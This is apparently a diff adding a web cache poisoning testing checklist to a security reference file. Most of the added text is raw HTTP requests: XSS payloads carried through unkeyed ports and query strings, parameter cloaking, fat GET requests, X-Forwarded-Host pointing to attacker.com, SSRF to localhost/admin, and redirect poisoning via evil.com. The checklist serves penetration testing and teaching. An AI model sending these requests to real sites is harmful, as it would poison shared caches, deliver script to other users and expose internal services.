@@ -63,6 +63,180 @@ User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
 X-Host: attacker.com
 ```
 
+## Comprehensive Web Cache Poisoning Testing Checklist
+
+### 1. Identify a Suitable Cache Oracle
+
+Objective: Find a page/endpoint that provides feedback on cache behavior.
+
+Steps:
+
+* Look for pages with dynamic content (e.g., redirects, time-sensitive data).
+
+* Check for cache-related headers like `Cache-Status`, `X-Cache`, or `Age`.
+
+* Test response times (cached responses are typically faster).
+
+* Use third-party cache-specific headers (e.g., `Pragma: akamai-x-get-cache-key` to reveal cache keys).
+
+Example:
+```html
+GET /?param=test HTTP/1.1
+Host: example.com
+Pragma: akamai-x-get-cache-key
+```
+If the response includes `X-Cache-Key: example.com/?param=test`, this is a valid cache oracle.
+
+### 2. Probe Cache Key Handling
+
+Objective: Identify transformations in cache keys (e.g., excluded parameters, normalization).
+
+Steps:
+
+* Test unkeyed ports in the Host header:
+```html
+GET / HTTP/1.1
+Host: example.com:1337  # Poisoning attempt
+```
+If the cached response retains the port in redirects (e.g., `Location: https://example.com:1337/en`), the port is unkeyed.
+
+* Test unkeyed query strings:
+```html
+GET /?utm_content=payload HTTP/1.1
+Host: example.com
+```
+If the response is cached and serves the same content regardless of `utm_content`, the query string is unkeyed.
+
+* Test parameter filtering:
+
+Send duplicate parameters or malformed syntax (e.g., `/?param=1&param=2`, `/?param[1]=test`).
+
+Check if the cache ignores duplicates or normalizes input.
+
+* Test path normalization:
+```html
+GET // HTTP/1.1                 # Apache
+GET /%2F HTTP/1.1               # Nginx
+GET /index.php/xyz HTTP/1.1     # PHP
+```
+If these paths are treated as `/` by the server but cached separately, path normalization is flawed.
+
+### 3. Exploit Cache Poisoning
+
+### 3.1 Unkeyed Port in Host Header
+
+Exploit: Inject malicious ports to poison redirects or trigger XSS.
+```html
+GET / HTTP/1.1
+Host: example.com:"><svg onload=alert(1)>
+```
+If the `Location` header reflects the port, users are redirected to a page with XSS.
+
+### 3.2 Unkeyed Query String
+
+Exploit: Poison cached pages with stored XSS.
+```html
+GET /?utm_content=<script>alert(1)</script> HTTP/1.1
+Host: example.com
+```
+If the query string is unkeyed, all users visiting `/` will execute the payload.
+
+### 3.3 Cache Parameter Cloaking
+
+Exploit: Bypass parameter filtering using parsing quirks.
+```html
+GET /?utm_content=123?param=alert(1) HTTP/1.1
+Host: example.com
+```
+The cache ignores `utm_content`, but the server treats `param=alert(1)` as a valid parameter.
+
+### 3.4 Normalized Cache Keys
+
+Exploit: Use URL-encoded payloads to bypass sanitization.
+```html
+GET /?param=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+Host: example.com
+```
+If the cache normalizes the key, the decoded payload is stored and executed.
+
+### 3.5 Fat GET Requests
+
+Exploit: Poison caches using GET requests with bodies.
+```html
+GET /?param=innocent HTTP/1.1
+Host: example.com
+Content-Length: 13
+X-HTTP-Method-Override: POST
+
+param=malicious
+```
+The cache key uses the request line, but the server processes the body.
+
+### 3.6 Cache Poisoning via HTTP Header Injection
+
+Exploit: Inject headers affecting the cache behavior.
+```html
+GET / HTTP/1.1
+Host: example.com
+X-Forwarded-Host: attacker.com
+```
+If the cache stores responses based on `X-Forwarded-Host`, users receive poisoned content from `attacker.com`.
+
+### 3.7 Cache Poisoning with SSRF
+
+Exploit: Inject requests leading to internal services.
+```html
+GET /?url=http://localhost/admin HTTP/1.1
+Host: example.com
+```
+If the cache stores responses from internal URLs, attackers can retrieve internal data.
+
+### 4. Poison Internal Caches
+
+Objective: Exploit application-level caches that store reusable fragments.
+
+Steps:
+
+* Identify pages where inputs are reflected across multiple responses (e.g., headers in CSS/JS files).
+
+* Inject payloads into static resources:
+```html
+GET /style.css?excluded_param=alert(1); HTTP/1.1
+Host: example.com
+```
+If the response includes `alert(1);`, all pages importing `/style.css` will execute the payload.
+
+### 5. Precautionary Measures
+
+* Use controlled domains (e.g., `evil.com`) for payloads to avoid collateral damage.
+
+* Test with harmless payloads first (e.g., `alert(document.domain)`).
+
+* Bust the cache after testing:
+```html
+GET /?cachebuster=random123 HTTP/1.1
+Host: example.com
+```
+Example Scenario:
+
+* Flaw: Cache excludes the port from the Host header.
+
+Exploit:
+
+* Poison the cache with a malicious port:
+```html
+GET / HTTP/1.1
+Host: example.com:evil.com
+```
+* Users visiting `example.com` receive the poisoned response:
+```html
+HTTP/1.1 302 Moved Permanently
+Location: https://example.com:evil.com/en
+Cache-Status: hit
+```
+
+
+
 # Cache Deception
 ### Caching Sensitive Data
 Web Cache Deception on PayPal Home Page
